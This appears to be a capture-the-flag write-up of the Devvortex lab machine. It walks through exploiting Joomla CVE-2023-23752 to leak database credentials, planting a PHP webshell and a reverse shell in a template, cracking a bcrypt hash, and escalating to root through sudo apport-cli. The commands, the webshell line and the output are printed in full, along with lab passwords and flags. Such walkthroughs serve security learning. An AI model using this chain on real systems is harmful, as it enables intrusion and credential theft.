## Intro


Tags: #linux #WebApp #OSCPpath #DB #known-binary #easy

------
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.229.146 devvortex.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  devvortex.htb
```

```shell
└─$ sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  devvortex.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 15:18 -0400
Nmap scan report for devvortex.htb (10.129.229.146)
Host is up (0.058s latency).
Not shown: 65490 closed tcp ports (reset), 43 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A devvortex.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 15:19 -0400
Nmap scan report for devvortex.htb (10.129.229.146)
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   52.25 ms 10.10.14.1
2   52.42 ms devvortex.htb (10.129.229.146)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
```

## WebApp

![](MediaFiles/Pasted%20image%2020260617222035.png)

![](MediaFiles/Pasted%20image%2020260617222138.png)

# Directory enumeration

```shell
dirsearch -u http://devvortex.htb// -x 403,404
```

```shell

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                          
                                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ch3ckm8/Downloads/squashfs-root/reports/http_devvortex.htb/___26-06-17_15-20-52.txt

Target: http://devvortex.htb/

[15:20:52] Starting: /                                                                                                                           
[15:20:53] 301 -  178B  - //js  ->  http://devvortex.htb/js/                
[15:21:00] 200 -    7KB - //about.html                                      
[15:21:13] 200 -    9KB - //contact.html                                    
[15:21:14] 301 -  178B  - //css  ->  http://devvortex.htb/css/              
[15:21:20] 301 -  178B  - //images  ->  http://devvortex.htb/images/        

Task Completed           
```
nothing interesting found

## Subdomain enumeration

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -fs 154
```
subdomain found
```shell
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 104ms]
```
lets add it to hosts too:
```shell
echo '10.129.229.146 dev.devvortex.htb devvortex.htb' | sudo tee -a /etc/hosts
```
lets navigate there
![](MediaFiles/Pasted%20image%2020260617222545.png)

## Directory enumeration on subdomain

```shell
dirsearch -u http://dev.devvortex.htb// -x 403,404
```

interesting, at first `robots.txt`
```shell
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
next, `/administrator` indicates joomla installation
![](MediaFiles/Pasted%20image%2020260617222906.png)

-------
# Foothold

## Vulnerable webapp version found

next i found the version in the `http://dev.devvortex.htb/README.txt`
![](MediaFiles/Pasted%20image%2020260617223234.png)
this version was found vulnerable to this CVE: CVE-2023–23752
https://github.com/Pushkarup/CVE-2023-23752

```shell
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

```shell
* Host dev.devvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.146
*   Trying 10.129.229.146:80...
* Established connection to dev.devvortex.htb (10.129.229.146 port 80) from 10.10.14.148 port 56646 
* using HTTP/1.x
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 17 Jun 2026 19:34:10 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Wed, 17 Jun 2026 19:34:10 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb:80 left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```
found creds on this snippet
```shell
attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}}
```
#### creds obtained
```
lewis
P4ntherg0t1n5r3c0n##
```
Lets use it to login to joomla login page, once logged in, we are prompted in this page

## Joomla login
![](MediaFiles/Pasted%20image%2020260617223612.png)

### Editing joompla template
tried to edit component.php with php-reverse shell but failed
![](MediaFiles/Pasted%20image%2020260617224309.png)
then did the same but on error.php, and tho it was saved successfully, it did not work

### Embed php revshell

then tried adding this inside error.php
```php
system($_GET['cmd']);
```
then confirmed rce
```shell
└─$ curl 'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id'                                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
now that we confirmed php webshell works, lets do a php rev shell
pasted this one on error.php : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
and then requested:
```shell
curl 'http://dev.devvortex.htb/templates/cassiopeia/error.php'
```
and got shell back on listener
## Shell as www-data
```shell
└─$ nc -nvlp 5555                                                                                                                                
listening on [any] 5555 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.229.146] 60546
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:58:50 up 42 min,  0 users,  load average: 0.06, 0.02, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devvortex:/$ 

www-data@devvortex:/$ 
```

### Mysql enum

```shell
www-data@devvortex:/$ mysql -h 127.0.0.1 -u lewis -pP4ntherg0t1n5r3c0n##  
  
mysql> show databases;  
  
mysql> use joomla  
  
mysql> select * from sd4fg_users;
```

```shell
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla
use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2026-06-17 19:35:26 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```
#### hash obtained
```shell
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

logan@devvortex.htb
```

### Hash cracking

```shell
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

```shell
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
```
#### creds obtained
```shell
logan
tequieromucho
```

## Shell as logan

grabbed user flag
```shell
ssh logan@devvortex.htb
```

```shell
Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ cat user.txt 
18d8fe0e826d9a3b1381ae62762d90e4
```

----
# Privesc

## sudo -l

```shell
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
lets run it
```shell
logan@devvortex:~$ sudo /usr/bin/apport-cli

No pending crash reports. Try --help for more information.
logan@devvortex:~$ 
logan@devvortex:~$ sudo /usr/bin/apport-cli --help[
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

apport-cli: error: no such option: --help[
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

### Known binary
played with the options, and also found this on gtfobins
https://gtfobins.org/gtfobins/apport-cli/

## Shell as root
```shell
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

..dpkg-query: no packages found matching xorg
...................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
root@devvortex:/home/logan# cd
root@devvortex:~# cat root.txt
3f1118fdafea428db28242ecb09a9a0b
```


---
# Summary







-------
# Sidenotes


